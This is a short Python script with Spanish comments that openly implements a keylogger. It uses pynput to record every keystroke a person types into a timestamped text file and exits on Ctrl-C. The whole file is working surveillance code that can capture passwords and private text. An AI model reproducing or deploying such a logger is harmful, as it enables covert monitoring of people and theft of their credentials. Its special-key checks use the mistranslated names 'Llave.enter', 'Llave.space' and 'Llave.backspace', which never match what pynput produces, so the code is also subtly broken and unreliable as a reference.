import datetime
from pynput.keyboard import Listener

#con el datatime ponemos los datos del dia y el horario de la optencion del archivo
x = datetime.datetime.now().strftime('%Y-%m-%d %H-%M-%S')

#nombre del archivo txt en el que se guarda lo tipieado
p = open(f'keylogger_{x}.txt', 'w')

#la funcion que define como vamos a obtener los datos o como se van a mostrar
def registro(llave):

    llave = str(llave)

    if llave == "'\\x03'":
        p.close()
        quit()
    elif llave == 'Llave.enter':
        p.write('\n')
    elif llave == 'Llave.space':
        p.write(' ')
    elif llave == 'Llave.backspace':
        p.write('%BORRAR%')
    else:
        p.write(llave.replace("'",""))

with Listener(on_press=registro) as u:
    u.join()